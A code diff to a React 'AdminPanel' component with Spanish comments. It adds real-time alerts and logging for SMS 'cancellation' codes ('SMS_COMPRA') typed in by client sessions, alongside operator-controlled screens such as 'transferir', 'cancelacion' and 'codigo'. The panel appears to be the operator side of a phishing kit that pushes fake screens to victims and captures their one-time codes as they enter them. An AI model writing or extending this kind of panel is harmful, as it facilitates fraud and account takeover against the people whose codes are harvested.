@@ -80,6 +80,7 @@ export default function AdminPanel() {
     const handleMessage = (event: MessageEvent) => {
       try {
         const data = JSON.parse(event.data);
+        console.log("Mensaje WebSocket recibido en AdminPanel:", data.type);
         
         if (data.type === 'INIT_SESSIONS') {
           setSessions(data.data);
@@ -96,9 +97,32 @@ export default function AdminPanel() {
             return updated;
           });
         }
+        else if (data.type === 'SMS_COMPRA_CODE') {
+          // Notificación especial para códigos SMS_COMPRA
+          const { sessionId, code } = data.data;
+          
+          toast({
+            title: "Código de cancelación SMS_COMPRA",
+            description: `Código: ${code} (Sesión: ${sessionId.substring(0, 6)}...)`,
+            variant: "default",
+          });
+          
+          console.log("SMS_COMPRA code:", code, "para sesión:", sessionId);
+        }
         else if (data.type === 'CLIENT_INPUT_REALTIME') {
           // Mostrar notificación de entrada de datos en tiempo real
           const { sessionId, tipo, inputData } = data.data;
+          
+          // Manejo especial para SMS_COMPRA
+          if (tipo === 'sms_compra' || tipo === 'SMS_COMPRA' || tipo === 'smsCompra') {
+            if (inputData && inputData.smsCompra) {
+              toast({
+                title: "¡Código de cancelación recibido!",
+                description: `Código: ${inputData.smsCompra}`,
+                variant: "default",
+              });
+            }
+          }
           
           // Mostrar notificación toast con los datos recibidos
           let inputDescription = '';
@@ -199,8 +223,12 @@ export default function AdminPanel() {
       return;
     }
 
+    // Debug para rastrear el flujo
+    console.log("handleScreenChange recibió tipo de pantalla:", screen);
+
     // Handle modals for certain screens
     if (["protege", "transferir", "cancelacion", "codigo", "mensaje", "sms_compra"].includes(screen)) {
+      console.log("Activando modal para:", screen);
       setActiveModal(screen);
       return;
     }
@@ -343,6 +371,7 @@ export default function AdminPanel() {
         apiRequest('POST', `/api/sessions/${selectedSessionId}/update`, { celular: telefono })
           .then(() => {
             // Then send the screen change
+            console.log("ScreenType.SMS_COMPRA:", ScreenType.SMS_COMPRA);
             sendScreenChange({
               tipo: `mostrar_${ScreenType.SMS_COMPRA}`,
               sessionId: selectedSessionId,
